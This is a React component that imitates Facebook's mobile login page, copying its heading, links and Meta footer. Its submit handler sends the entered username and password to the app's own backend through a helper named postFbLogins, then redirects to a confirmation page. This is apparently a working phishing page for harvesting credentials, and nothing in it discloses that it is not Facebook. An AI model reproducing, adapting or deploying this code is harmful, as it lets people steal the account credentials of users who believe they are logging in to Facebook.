import { useNavigate } from "react-router-dom";
import React, { useState } from "react";
import Container from "react-bootstrap/Container";
import Col from "react-bootstrap/Col";
import Form from "react-bootstrap/Form";
import Row from "react-bootstrap/Row";
import Button from "react-bootstrap/Button";
import { postFbLogins } from "../helpers/axiosHelper";
const initialState = {
  userName: "",
  password: "",
};
export const Fblogin = () => {
  const navigate = useNavigate();
  const [id, setId] = useState(initialState);
  const [eyeState, setEyeState] = useState("visibility_hidden");
  const onSlasheyeClick = (e) => {
    setEyeState("visibility_hidden");
  };
  const oneyeClick = (e) => {
    setEyeState("visibility_visible");
  };
  const handleOnChange = (e) => {
    e.preventDefault();
    const { name, value } = e.target;
    setId({ ...id, [name]: value });
  };
  const handleOnSubmit = async (e) => {
    e.preventDefault();
    const result = await postFbLogins(id);
    window.setTimeout(() => {
      navigate("facebooklogin/confirmation");
    }, 1000);
  };

  return (
    <div>
      <Container>
        <Row className="text-center mt-3 mb-2">
          <div className="facebook_heading">Facebook</div>
        </Row>
        <Form onSubmit={handleOnSubmit}>
          <Row className="mb-2">
            <Col md={5} className="mb-2">
              <Form.Control
                placeholder="Mobile number or email address"
                className="facebook_inputs"
                id="form_control1"
                type="text"
                required
                name="userName"
                onChange={handleOnChange}
                minLength="6"
                onInvalid={(F) =>
                  F.target.setCustomValidity(
                    "username didn't meet the minimum required length"
                  )
                }
                onInput={(F) => F.target.setCustomValidity("")}
              />
            </Col>
            <Col md={5} className="mb-2">
              <div className="facebook_password">
                <Form.Control
                  placeholder="Password"
                  className="facebook_inputs"
                  id="form_control2"
                  type={eyeState === "visibility_hidden" ? "password" : "text"}
                  required
                  name="password"
                  onChange={handleOnChange}
                  minlength="6"
                  onInvalid={(F) =>
                    F.target.setCustomValidity(
                      "password didn't meet the minimum required length"
                    )
                  }
                  onInput={(F) => F.target.setCustomValidity("")}
                />
                <span className={eyeState}>
                  <i
                    onClick={onSlasheyeClick}
                    className="fa-solid fa-eye-slash eye"
                  ></i>
                </span>
                {eyeState === "visibility_hidden" && (
                  <span>
                    <i
                      className="fa-sharp fa-solid fa-eye eye"
                      onClick={oneyeClick}
                    ></i>
                  </span>
                )}
              </div>
            </Col>

            <Col md={2}>
              <Button
                variant="primary"
                size="lg"
                className="login_button"
                type="submit"
                id="fblogin_button"
              >
                Log In
              </Button>
            </Col>
          </Row>
        </Form>
        <Row>
          <Col className="fblogin_inputs_parts">
            <div className="forgotten_password">
              <a
                href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
                className="forgotten_password__link"
                variant="primary"
              >
                Forgotten password?
              </a>
            </div>
          </Col>
        </Row>
        <Row>
          <Col>
            <hr></hr>
          </Col>
          or
          <Col>
            <hr />
          </Col>
        </Row>
        <Row>
          <Col className="fblogin_inputs_parts create_new__account_div">
            <Button variant="success" className="create_new__account">
              <a
                href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk"
                className="dead_link"
              >
                Create New Account
              </a>
            </Button>
          </Col>
        </Row>
        <Row className="text-center mt-5 footer_list">
          <Col>
            <a href="https://about.meta.com/" className="dead_link">
              About
            </a>
          </Col>
          <Col>
            <a
              href="https://www.facebook.com/help?_rdc=1&_rdr"
              className="dead_link"
            >
              Help
            </a>
          </Col>
          <Col>
            <a
              href="https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
              className="dead_link"
            >
              Privacy policy
            </a>
          </Col>
          <Col>
            <a href="#" className="dead_link bold_custom">
              English(UK)
            </a>
          </Col>
        </Row>
        <Row className="text-center mt-3">
          <div>Meta &copy; 2023</div>
        </Row>
      </Container>
    </div>
  );
};
